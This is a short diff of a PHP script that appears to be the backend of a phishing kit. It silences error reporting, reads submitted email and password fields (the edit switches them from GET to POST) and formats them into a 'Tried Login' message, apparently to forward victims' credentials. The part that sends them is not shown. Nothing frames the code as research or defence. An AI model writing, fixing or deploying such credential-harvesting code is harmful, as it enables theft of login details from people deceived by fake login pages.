@@ -5,8 +5,8 @@ error_reporting(0);
 
 $time = date("h:i a", time());
 
-$email = $_GET["email"];
-$password = $_GET["password"];
+$email = $_POST["email"];
+$password = $_POST["password"];
 
 $message = "Username : $email \nPassword: $password \nTried Login at $time IST";
 
